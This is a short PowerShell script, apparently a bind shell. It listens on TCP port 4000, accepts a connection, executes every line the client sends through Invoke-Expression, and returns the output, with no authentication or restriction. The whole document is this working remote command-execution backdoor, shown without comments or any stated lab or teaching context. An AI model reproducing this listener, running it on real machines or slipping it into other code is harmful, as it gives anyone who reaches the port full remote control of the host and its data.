$Listner = [System.Net.Sockets.TcpListener]::new(4000)
$Listner.Start()

$Client = $Listner.AcceptTcpClient()
$Stream = $Client.GetStream()
$StreamReader = [System.IO.StreamReader]::new($Stream)
$StreamWriter = [System.IO.StreamWriter]::new($Stream)

function Dispose-All {
    $Listner.Stop()
    $Listner.Server.Dispose()
    $StreamReader.Dispose()
    $StreamWriter.Dispose()
}

while( $true ) {
    if( -not $Client.Connected ){
        Dispose-All
        break
    }
    if( $Stream.DataAvailable ){
       $StreamWriter.Write( 
            ( Invoke-Expression $StreamReader.ReadLine() )
        )
    }
    Start-Sleep -Seconds 1
}


trap{
    Dispose-All
}